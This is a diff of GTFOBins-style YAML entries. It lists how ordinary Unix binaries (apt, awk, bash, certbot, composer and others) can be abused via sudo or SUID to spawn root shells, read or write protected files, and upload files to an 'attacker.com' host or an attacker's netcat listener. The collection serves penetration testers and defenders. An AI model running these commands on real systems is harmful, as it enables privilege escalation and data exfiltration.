@@ -1,3 +1,4 @@
+functions:
 file-upload:
 - description: Upload local file via HTTP POST request.
 code: |
@@ -22,9 +23,11 @@ URL=http://attacker.com/
 LFILE=file_to_send
 sudo ab -p $LFILE $URL
 ---
+functions:
 suid:
 - code: ./agetty -o -p -l /bin/sh -a root tty
 ---
+description: The file is displayed in the `alpine` curses terminal interface. Other options might be available, for example by pressing `S` is possible to save the file content elsewhere.
 functions:
 file-read:
 - code: |
@@ -39,6 +42,7 @@ sudo:
 LFILE=file_to_read
 sudo alpine -F "$LFILE"
 ---
+functions:
 shell:
 - code: |
 TF=$(mktemp)
@@ -50,6 +54,7 @@ TF=$(mktemp)
 echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
 sudo ansible-playbook $TF
 ---
+functions:
 shell:
 - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
 code: |
@@ -68,6 +73,7 @@ sudo apt-get install -c $TF sl
 - description: When the shell exits the `update` command is actually executed.
 code: sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 ---
+functions:
 shell:
 - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
 code: |
@@ -86,6 +92,7 @@ sudo apt install -c $TF sl
 - description: When the shell exits the `update` command is actually executed.
 code: sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
 ---
+description: The file appears amid the binary content of the archive.
 functions:
 file-read:
 - code: |
@@ -106,6 +113,7 @@ LFILE=file_to_read
 sudo ar r "$TF" "$LFILE"
 cat "$TF"
 ---
+description: Note that the subprocess is immediately sent to the background.
 functions:
 command:
 - code: |
@@ -131,6 +139,7 @@ echo "$COMMAND" > $TF
 chmod +x $TF
 ./aria2c --on-download-error=$TF http://x
 ---
+functions:
 file-read:
 - description: The file appears amid some other textual information. The archive can also be downloaded then extracted offline.
 code: |
@@ -166,6 +175,7 @@ echo DATA >"$TF/$LFILE"
 arj a "$TF/a" "$TF/$LFILE"
 ./arj e "$TF/a" $LDIR
 ---
+description: |
 The read file content is corrupted by error prints.
 functions:
 file-read:
@@ -181,6 +191,7 @@ sudo:
 LFILE=file_to_read
 sudo arp -v -f "$LFILE"
 ---
+description: The file content is treated as command line options and disclosed throught error messages, so this is not suitable to read arbitrary binary data.
 functions:
 file-read:
 - code: |
@@ -195,6 +206,7 @@ sudo:
 LFILE=file_to_read
 sudo as @$LFILE
 ---
+functions:
 file-read:
 - code: |
 LFILE=file_to_read
@@ -208,6 +220,7 @@ sudo:
 LFILE=file_to_read
 sudo ascii-xfr -ns "$LFILE"
 ---
+functions:
 file-read:
 - code: |
 LFILE=file_to_read
@@ -217,6 +230,7 @@ sudo:
 LFILE=file_to_read
 sudo ascii85 "$LFILE" | ascii85 --decode
 ---
+functions:
 shell:
 - code: ash
 file-write:
@@ -228,6 +242,7 @@ suid:
 sudo:
 - code: sudo ash
 ---
+description: The textual file is displayed in an interactive TUI showing only the parts that contain mispelled words.
 functions:
 file-read:
 - code: |
@@ -242,6 +257,7 @@ sudo:
 LFILE=file_to_read
 sudo aspell -c "$LFILE"
 ---
+functions:
 shell:
 - code: |
 echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
@@ -254,6 +270,7 @@ sudo:
 - code: |
 echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
 ---
+description: Outputs the first line of the file to standard error without the `-` and `#` characters, this can be customized with the `-c` option, by default is `-c -#`.
 functions:
 file-read:
 - code: |
@@ -268,6 +285,7 @@ suid:
 LFILE=file_to_read
 ./atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
 ---
+functions:
 shell:
 - code: awk 'BEGIN {system("/bin/sh")}'
 non-interactive-reverse-shell:
@@ -304,6 +322,7 @@ sudo:
 limited-suid:
 - code: ./awk 'BEGIN {system("/bin/sh")}'
 ---
+functions:
 file-read:
 - code: |
 LFILE=file_to_read
@@ -317,6 +336,7 @@ sudo:
 LFILE=file_to_read
 sudo base32 "$LFILE" | base32 --decode
 ---
+functions:
 file-read:
 - code: |
 LFILE=file_to_read
@@ -326,6 +346,7 @@ sudo:
 LFILE=file_to_read
 sudo base58 "$LFILE" | base58 --decode
 ---
+functions:
 file-read:
 - code: |
 LFILE=file_to_read
@@ -339,6 +360,7 @@ sudo:
 LFILE=file_to_read
 sudo base64 "$LFILE" | base64 --decode
 ---
+functions:
 file-read:
 - code: |
 LFILE=file_to_read
@@ -352,6 +374,7 @@ sudo:
 LFILE=file_to_read
 sudo basenc --base64 $LFILE | basenc -d --base64
 ---
+functions:
 file-read:
 - code: |
 LFILE=file_to_read
@@ -365,6 +388,7 @@ sudo:
 LFILE=file_to_read
 sudo basez "$LFILE" | basez --decode
 ---
+functions:
 shell:
 - code: bash
 reverse-shell:
@@ -435,6 +459,7 @@ suid:
 sudo:
 - code: sudo bash
 ---
+functions:
 sudo:
 - code: sudo bpftrace -e 'BEGIN {system("/bin/sh");exit()}'
 - code: |
@@ -443,6 +468,7 @@ echo 'BEGIN {system("/bin/sh");exit()}' >$TF
 sudo bpftrace $TF
 - code: sudo bpftrace -c /bin/sh -e 'END {exit()}'
 ---
+description: Outputs the first line of the file (until the first whitespace) inside an error message to stdandard error.
 functions:
 file-read:
 - code: |
@@ -457,6 +483,7 @@ sudo:
 LFILE=file_to_read
 sudo bridge -b "$LFILE"
 ---
+functions:
 shell:
 - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
 code: |
@@ -488,6 +515,7 @@ code: |
 sudo bundle help
 !/bin/sh
 ---
+functions:
 shell:
 - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
 code: |
@@ -519,6 +547,7 @@ code: |
 sudo bundler help
 !/bin/sh
 ---
+description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
 functions:
 shell:
 - code: |
@@ -529,6 +558,7 @@ sudo:
 sudo busctl --show-machine
 !/bin/sh
 ---
+description: BusyBox may contain many UNIX utilities, run `busybox --list-full` to check what GTFBins binaries are supported. Here some example.
 functions:
 shell:
 - code: busybox sh
@@ -551,6 +581,7 @@ code: "./busybox sh"
 sudo:
 - code: sudo busybox sh
 ---
+functions:
 shell:
 - code: |
 TF=$(mktemp)
@@ -570,6 +601,7 @@ echo 'system("/bin/sh")' > $TF
 sudo byebug $TF
 continue
 ---
+description: There are also a number of other utilities that rely on `bzip2` under the hood, e.g., `bzless`, `bzcat`, `bunzip2`, etc. Besides having similar features, they also allow privileged reads if `bzip2` itself is SUID.
 functions:
 file-read:
 - code: |
@@ -584,6 +616,7 @@ sudo:
 LFILE=file_to_read
 sudo bzip2 -c $LFILE | bzip2 -d
 ---
+functions:
 file-read:
 - code: |
 LFILE=file_to_read
@@ -597,6 +630,7 @@ shell:
 sudo:
 - code: sudo c89 -wrapper /bin/sh,-s .
 ---
+functions:
 file-read:
 - code: |
 LFILE=file_to_read
@@ -610,6 +644,7 @@ shell:
 sudo:
 - code: sudo c99 -wrapper /bin/sh,-s .
 ---
+functions:
 file-upload:
 - description: Send local file using a TCP connection. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.
 code: |
@@ -618,6 +653,7 @@ RPORT=12345
 LFILE=file_to_send
 cancel -u "$(cat $LFILE)" -h $RHOST:$RPORT
 ---
+functions:
 shell:
 - code: capsh --
 suid:
@@ -625,6 +661,7 @@ suid:
 sudo:
 - code: sudo capsh --
 ---
+functions:
 file-read:
 - code: |
 LFILE=file_to_read
@@ -638,11 +675,13 @@ sudo:
 LFILE=file_to_read
 sudo cat "$LFILE"
 ---
+functions:
 shell:
 - code: cdist shell -s /bin/sh
 sudo:
 - code: sudo cdist shell -s /bin/sh
 ---
+functions:
 shell:
 - code: |
 TF=$(mktemp -d)
@@ -652,6 +691,7 @@ sudo:
 TF=$(mktemp -d)
 sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'
 ---
+description: |
 This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.
 functions:
 shell:
@@ -661,6 +701,7 @@ sudo:
 - description: The shell will only last 10 seconds.
 code: sudo check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C xx
 ---
+description: |
 This is the `check_cups` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.
 functions:
 file-read:
@@ -672,6 +713,7 @@ sudo:
 LFILE=file_to_read
 sudo check_cups --extra-opts=@$LFILE
 ---
+description: |
 This is the `check_log` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.
 functions:
 file-read:
@@ -691,6 +733,7 @@ LFILE=file_to_write
 INPUT=input_file
 sudo check_log -F $INPUT -O $LFILE
 ---
+description: |
 This is the `check_memory` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.
 functions:
 file-read:
@@ -702,6 +745,7 @@ sudo:
 LFILE=file_to_read
 sudo check_memory --extra-opts=@$LFILE
 ---
+description: |
 This is the `check_raid` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.
 functions:
 file-read:
@@ -713,6 +757,7 @@ sudo:
 LFILE=file_to_read
 sudo check_raid --extra-opts=@$LFILE
 ---
+description: |
 This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.
 functions:
 command:
@@ -737,6 +782,7 @@ umask 022
 check_ssl_cert --curl-bin $TF -H example.net
 cat $OUTPUT
 ---
+description: |
 This is the `check_statusfile` Nagios plugi plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.
 functions:
 file-read:
@@ -748,6 +794,7 @@ sudo:
 LFILE=file_to_read
 sudo check_statusfile $LFILE
 ---
+description: This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.
 functions:
 suid:
 - code: |
@@ -758,6 +805,7 @@ sudo:
 LFILE=file_to_change
 sudo chmod 6777 $LFILE
 ---
+functions:
 shell:
 - code: choom -n 0 /bin/sh
 suid:
@@ -765,6 +813,7 @@ suid:
 sudo:
 - code: sudo choom -n 0 /bin/sh
 ---
+description: This can be run with elevated privileges to change ownership and then read, write, or execute a file.
 functions:
 suid:
 - code: |
@@ -775,6 +824,7 @@ sudo:
 LFILE=file_to_change
 sudo chown $(id -un):$(id -gn) $LFILE
 ---
+functions:
 suid:
 - code: |
 ./chroot / /bin/sh -p
@@ -782,6 +832,7 @@ sudo:
 - code: |
 sudo chroot /
 ---
+description: Dump the bytes of the input file that are different from the NUL byte in a tabular format, hence this may not be suitable to read arbitrary binary files.
 functions:
 file-read:
 - code: |
@@ -796,6 +847,7 @@ sudo:
 LFILE=file_to_read
 sudo cmp $LFILE /dev/zero -b -l
 ---
+functions:
 shell:
 - code: |
 TF=$(mktemp -d)
@@ -807,6 +859,7 @@ TF=$(mktemp -d)
 echo 'CALL "SYSTEM" USING "/bin/sh".' > $TF/x
 sudo cobc -xFj --frelax-syntax-checks $TF/x
 ---
+description: |
 `column` expects textual data.
 functions:
 file-read:
@@ -822,6 +875,7 @@ sudo:
 LFILE=file_to_read
 sudo column $LFILE
 ---
+functions:
 file-read:
 - code: |
 LFILE=file_to_read
@@ -835,6 +889,7 @@ sudo:
 LFILE=file_to_read
 sudo comm $LFILE /dev/null 2>/dev/null
 ---
+functions:
 shell:
 - code: |
 TF=$(mktemp -d)
@@ -851,6 +906,7 @@ TF=$(mktemp -d)
 echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
 sudo composer --working-dir=$TF run-script x
 ---
+description: It allows to execute [`perl`](/gtfobins/perl) code, other functions may apply.
 functions:
 shell:
 - code: |
@@ -863,6 +919,7 @@ TF=$(mktemp)
 echo 'exec "/bin/sh";' >$TF
 sudo cowsay -f $TF x
 ---
+description: It allows to execute [`perl`](/gtfobins/perl) code, other functions may apply.
 functions:
 shell:
 - code: |
@@ -875,6 +932,7 @@ TF=$(mktemp)
 echo 'exec "/bin/sh";' >$TF
 sudo cowthink -f $TF x
 ---
+functions:
 file-read:
 - code: |
 LFILE=file_to_read
